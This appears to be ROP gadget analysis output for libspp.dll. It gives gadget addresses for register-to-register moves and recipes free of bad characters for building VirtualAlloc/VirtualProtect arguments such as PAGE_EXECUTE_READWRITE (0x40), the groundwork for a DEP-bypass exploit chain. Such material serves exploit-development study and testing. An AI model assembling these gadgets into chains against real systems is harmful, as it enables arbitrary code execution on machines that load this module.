# libspp.dll - optimized ROP analysis (badchars 00 0a 0d 25 26 3d)


## Ranked register-transfer candidates (optimized)

Lower cost = cleaner/shorter/fewer side effects. When the primary route uses a
gadget with a bad address or a large stack adjustment, pick a higher-ranked
alternative below.

### eax -> ebx
```
Candidate 1: eax -> ebx                 cost=259 [filler=29200]
    0x100639e1  # push eax # add al,5dh # mov eax,1 # pop ebx # add esp,7210h # retn 0x08
Candidate 2: eax -> esp -> ebx          cost=335
    0x101394a9  # xchg eax,esp # retn
    0x100b895d  # push esp # add [eax],eax # add [ebx+5d5e5fc6h],cl # pop ebx # retn 0x04
Candidate 3: eax -> ecx -> esp -> ebx   cost=468
    0x100baecb  # xchg eax,ecx # retn
    0x100e1d04  # push ecx # pop esp # retn
    0x100b895d  # push esp # add [eax],eax # add [ebx+5d5e5fc6h],cl # pop ebx # retn 0x04
```

### eax -> ecx
```
Candidate 1: eax -> ecx                 cost=95
    0x100baecb  # xchg eax,ecx # retn
```

### eax -> edx
```
Candidate 1: eax -> edx                 cost=95
    0x100cb4d4  # xchg eax,edx # retn
Candidate 2: eax -> ebx -> edx          cost=426 [filler=29204]
    0x100639e1  # push eax # add al,5dh # mov eax,1 # pop ebx # add esp,7210h # retn 0x08
    0x1015734e  # add edx,ebx # pop ebx # retn 0x10
Candidate 3: eax -> esp -> ebx -> edx   cost=502
    0x101394a9  # xchg eax,esp # retn
    0x100b895d  # push esp # add [eax],eax # add [ebx+5d5e5fc6h],cl # pop ebx # retn 0x04
    0x1015734e  # add edx,ebx # pop ebx # retn 0x10
```

### eax -> ebp
```
Candidate 1: eax -> ebp                 cost=95
    0x100cdc7a  # xchg eax,ebp # retn
Candidate 2: eax -> esp -> ebp          cost=307
    0x101394a9  # xchg eax,esp # retn
    0x101599b8  # push esp # or eax,[eax] # add [edi+5eh],bl # pop ebp # pop ebx # retn
Candidate 3: eax -> ecx -> esp -> ebp   cost=440
    0x100baecb  # xchg eax,ecx # retn
    0x100e1d04  # push ecx # pop esp # retn
    0x101599b8  # push esp # or eax,[eax] # add [edi+5eh],bl # pop ebp # pop ebx # retn
```

### eax -> esi
```
Candidate 1: eax -> esi                 cost=156
    0x1003f2d8  # push eax # mov eax,1 # pop esi # retn
Candidate 2: eax -> esp -> esi          cost=274
    0x101394a9  # xchg eax,esp # retn
    0x10136ab5  # push esp # and al,8 # pop esi # add esp,8 # retn
Candidate 3: eax -> ecx -> esi          cost=331
    0x100baecb  # xchg eax,ecx # retn
    0x10112ae1  # push ecx # inc esi # add al,0 # add esp,4 # mov eax,esi # pop esi # retn 0x04
```

### eax -> edi
```
Candidate 1: eax -> edi                 cost=95
    0x10125f85  # xchg eax,edi # retn
Candidate 2: eax -> esp -> edi          cost=307
    0x101394a9  # xchg eax,esp # retn
    0x1012cac8  # push esp # add [eax],al # add esp,0ch # pop edi # pop esi # retn
Candidate 3: eax -> edx -> edi          cost=339
    0x100cb4d4  # xchg eax,edx # retn
    0x1001c514  # push edx # inc eax # pop edi # pop esi # pop ecx # retn 0x08
```



## Value construction advisor (optimized)

Cheapest bad-char-free way to load each target value into a register.
'(none)' means this module cannot build it directly in that register
(needs a move from another register - see candidate routes above).

```
dwSize = 0x201
   eax  cost=162 : pop eax=0xfffffdff ; neg eax
   ebx  (none)
   ecx  (none)
   edx  (none)

dwSize = 0x1
   eax  cost=160 : pop eax=0xffffffff ; inc eax ; inc eax
   ebx  cost=160 : pop ebx=0xffffffff ; inc ebx ; inc ebx
   ecx  cost=160 : pop ecx=0xffffffff ; inc ecx ; inc ecx
   edx  cost=160 : pop edx=0xffffffff ; inc edx ; inc edx

flProtect/NewProtect = 0x40
   eax  cost=162 : pop eax=0xffffffc0 ; neg eax
   ebx  (none)
   ecx  (none)
   edx  (none)

flAllocationType = 0x1000
   eax  cost=202 : pop eax=0xffffefff ; neg eax ; dec eax
   ebx  (none)
   ecx  (none)
   edx  (none)

```

